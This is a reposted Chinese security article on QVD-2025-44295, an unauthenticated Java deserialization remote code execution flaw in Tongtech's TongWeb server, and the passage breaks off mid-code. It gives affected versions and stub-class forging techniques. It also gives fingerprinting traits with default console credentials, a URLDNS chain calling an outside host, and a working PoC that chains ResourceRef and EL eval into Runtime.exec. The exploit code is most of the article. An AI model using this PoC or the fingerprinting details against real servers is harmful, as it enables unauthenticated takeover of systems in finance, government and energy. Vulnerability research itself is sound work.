---
title: QVD-2025-44295：东方通TongWeb应用服务器ejbserver远程代码执行漏洞
url: https://mp.weixin.qq.com/s/vjQ2lGVNCMhMNWU4pw6U1A
source: Doonsec's feed
date: 2026-01-28
fetch_date: 2026-01-29T04:03:28.869361
---

# QVD-2025-44295：东方通TongWeb应用服务器ejbserver远程代码执行漏洞

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVshxCyILZtwNSbk091UtaGg1m1BdEgiccFX3ExKRcsyNz9sODaRtUrwqZnibMbfStZUEWZZJoEscVRNQ/0?wx_fmt=jpeg)

# QVD-2025-44295：东方通TongWeb应用服务器ejbserver远程代码执行漏洞

Bear Hackers Industry

![]()

在小说阅读器中沉浸阅读

编者荐语：

再发一遍💪

以下文章来源于Timeline Sec
，作者漏洞研究组

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM5EEaRaUz2462UfHPhbbY6AKLP023JKTKMu1U5aDzuEUg/0)

**Timeline Sec**
.

学网络安全必备，专注于最新漏洞分析与复现，同时分享团队动态、安全招聘、活动沙龙等内容。（Timeline Sec网络安全团队官方公众号）

> 关注我们❤️，添加星标🌟，一起学安全！
> 作者：Howell & N1Rvana
> 本文字数：9406
> 阅读时长：3～5mins
> 声明：仅供学习参考使用，请勿用作违法用途，否则后果自负

## 0x01 简介

TongWeb 是东方通（Beijing Tongtech Co., Ltd.）自主研发的企业级应用服务器，全面支持 Java EE（现 Jakarta EE）标准，兼容主流开发框架，广泛应用于金融、电信、政府、能源等关键行业的信息化和数字化转型。TongWeb 具备高性能、高可用、分布式和集群部署能力，支持微服务架构、容器化和云原生环境，能够灵活适配多种操作系统和硬件平台。

## 0x02 漏洞概述

**漏洞编号：QVD-2025-44295**
该漏洞的核心在于 **TongWeb 应用服务器在默认配置下，将 `ejbserver` 接口暴露在 Web 端口，同时其 EJB 服务接口未能对输入的 Java 序列化对象进行有效的安全过滤**。

TongWeb 默认在 Web 容器里挂载 `/ejbserver` 路径，把外部 HTTP 请求直接转发给内部 EJB 二进制 RPC 处理链。最终在 `ServerMetaData.readExternal()` 里调用无任何白名单校验的 `ObjectInputStream.readObject()`。

攻击者只需向 `/ejbserver` 发送一段精心构造的 Java 原生序列化数据（内含 CommonsCollections、javax.swing.UIDefaults 等 Gadget Chain），服务器在反序列化过程中会自动执行 Gadget 里各个类在初始化阶段被回调的方法，串出一条通往 `Runtime.exec()` 或 `ProcessBuilder.start()` 的调用路径，从而实现远程代码执行（RCE）。

## 0x03 利用条件

**1）影响版本**

* 7.0.0.0 <= TongWeb <= 7.0.4.9\_M9
* 6.1.7.0 <= TongWeb <= 6.1.8.13

**2）所需权限：**
无需

## 0x04 环境搭建

搭建环境的时候根据需求执行 `.sh` 脚本，有时需要修改启动/安装脚本或者配置文件中的配置路径。 另外，如果没有项目的源码也不要担心，还有以下三种替代方案可以构造 POC：

#### 方案 A：手写“影子类” (Stubbing)

根据 POC 代码，在本地创建一个**同包名、同类名**的空类，并实现 `Serializable` 接口。
**关键点：不仅要包名+类名一致，还必须把父类 `javax.naming.Reference` 的所有私有字段原样拷贝，且 `serialVersionUID` 必须与目标容器里的版本一字不差（可用 `serialver` 或 `ObjectStreamClass.lookup()` 提取）。**

1、在项目中创建包：`com.tongweb.naming`。
2、创建 `ResourceRef`：

```
package com.tongweb.naming;
import javax.naming.Reference;
import java.io.Serializable;
publicclass ResourceRef extends Reference implements Serializable {
    privatestaticfinallong serialVersionUID = 目标容器的UID; // ← 必须一致
    public ResourceRef(String className, String factory, String factoryLocation) {
        super(className, factory, factoryLocation);
    }
    // 把 POC 里的 7 参构造补齐
    public ResourceRef(String className, String factory, String factoryLocation,
                       String factoryInterface, boolean singleton,
                       String beanFactory, String beanFactoryLocation) {
        super(className, factory, factoryLocation);
        setFactoryClassName(factory);
        setFactoryClassLocation(factoryLocation);
        setClassName(className);
        // 其余逻辑按 POC 实际参数补
    }
}
```

3、同样方法伪造 `ContextUtil.ReadOnlyBinding`，注意把内部私有字段、`serialVersionUID` 全部对齐。

#### 方案 B：使用字节码操纵库 (Javassist / ASM)

如果不想手动建几十个文件夹，可以用 Javassist 动态生成：

```
ClassPool pool = ClassPool.getDefault();
CtClass ct = pool.makeClass("com.tongweb.naming.ResourceRef");
ct.setSuperclass(pool.get("javax.naming.Reference"));
ct.addInterface(pool.get("java.io.Serializable"));
// 必须显式设置 UID
ct.addField(CtField.make("private static final long serialVersionUID = 目标UID;", ct));
Class<?> clazz = ct.toClass(Poc.class, Poc.class.getClassLoader()); // 指定保护域，防止 IllegalAccessError
```

**注意：父类 `Reference` 的私有字段（className、addrs 等）也要通过 `ct.addField` 补齐，否则反序列化会报 EOFException。**

#### 方案 C：使用现有安全工具框架

ysoserial 已经支持自定义 Gadget，只需：

1、把 `TongWebGadget` 按模板提交 PR；

2、指定 `forceString=x=eval` 和 `EL` 表达式即可。
框架会自动处理 ClassLoader、UID、字段对齐等问题。

#### 特别注意事项：OEJP/1.0 头

TongWeb 在 **非标准端口** 监听，协议格式为：`OEJP/1.0 + 1 字节版本号(POC里写1) + Java 原生序列化流`

* **脱离环境构造时：** 6 字节头 + 1 字节版本必须原样保留；
* **版本匹配：** 如果目标服务器的 `ResourceRef` 与本地伪造类的 `serialVersionUID` 不一致，服务端会在 `ObjectInputStream.readClassDesc()` 阶段直接抛 `InvalidClassException`，请求被丢弃，**不会进入 Gadget 逻辑**；
* **父类字段：** 即使 UID 相同，`Reference` 的私有字段布局一旦对不上，也会抛 `EOFException`，同样无法利用。

## 0x05 指纹特征

#### 1. HTTP  响应头

* `Server: TongWeb Server`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1J1IGYSSR0OnkMfiblKaIibHx0iaSyjKsTOCM20S1aaA1tEuNP5B8V82AA/640?wx_fmt=png&from=appmsg)

#### 2. 默认管理控制台路径与标题

TongWeb 的管理后台具有非常明显的特征，默认情况下开放于 **9060** 端口。

* **默认路径：**`/console/`
* **页面标题 (Title)：**`TongWeb`
* **登录页特征：** 页面通常包含东方通的 Logo。

#### 3. 默认端口特征

| 用途 | 默认端口 | 典型访问地址 | 备注 |
| --- | --- | --- | --- |
| **管理控制台** | 9060 | `http://<ip>:9060/console` | 首次登录账号 `thanos / thanos123.com`，会被强制改密。 |
| **业务应用** | 8088 | `http://<ip>:8088/<应用上下文>` | 部署 WAR 后，TongWeb 自动把应用映射到此端口。 |

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1o0J49PmVtzH62h3FVM28icl9myPuaputziaRpbKyQspQnmvMJqGCkIJQ/640?wx_fmt=png&from=appmsg)

## 0x06 漏洞复现

#### 反序列化链验证

写一个URLDNS链：

```
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

publicclass Main {
    public static void main(String[] args) throws Exception {
        HashMap h=new HashMap();
        URL url=new URL("https://bxxqes8f.requestrepo.com/");
        Class cls=Class.forName("java.net.URL");
        Field f = cls.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url,1);
        h.put(url,1);
        f.set(url,-1);

        FileOutputStream fileOutputStream = new FileOutputStream("ser.bin");
        fileOutputStream.write("OEJP/1.0".getBytes("UTF-8"));
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeByte(1);
        objectOutputStream.writeObject(h);
        objectOutputStream.close();
    }
}
```

成功接收到了回显！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1AKGmP80KO1gKKGI8UeMxpUsIYUmzCjrwlWT1MwA4O8TSsOMIfd9JCg/640?wx_fmt=png&from=appmsg)

#### RCE

构造PoC：

* PoC 最好放在源码的 `lib/` 目录下编译并运行
* 运行后会生成一个后缀为 `.ser` 的恶意文件
* 推荐运行的 JDK 版本为 1.8

```
import com.tongweb.naming.ResourceRef;
import com.tongweb.xbean.naming.context.ContextUtil;
import com.tongweb.xbean.naming.context.WritableContext;
import sun.reflect.ReflectionFactory;
import javax.management.BadAttributeValueExpException;
import javax.naming.Context;
import javax.naming.StringRefAddr;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

publicclass Poc {
    public static void main(String[] args) throws Exception {

        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "com.tongweb.naming.factory.BeanFactory", (String)null);
        resourceRef.add(new StringRefAddr("forceString", "faster=eval"));
        resourceRef.add(new StringRefAddr("faster", "Runtime.getRuntime().exec(\"touch /tmp/success\")"));

        Context ctx = (Context) createWithoutConstructor(WritableContext.class);
        ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("foo",resourceRef,ctx);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException((Object)null);
        setFieldValue(badAttributeValueExpException,"val",binding);

        FileOutputStream fileOutputStream = new FileOutputStream("ser.bin");
        fileOutputStream.write("OEJP/1.0".getBytes("UTF-8"));
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeByte(1);
        objectOutputStream.writeObject(badAttributeValueExpException);
        objectOutputStream.close();
    }

    public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException {
        Class clazz=object.getClass();
        Field declaredField=clazz.getDeclaredField(field_name);
        declaredField.setAccessible(true);
        declaredField.set(object,filed_value);
    }

    publicstatic <T> T createWithoutConstructor(Class<T> cls) {
        try {
            ReflectionFactory rf = ReflectionFactory.getReflectionFactory();

            Constructor<Object> objDef = Object.class.getDeclaredConstructor();
            Construc...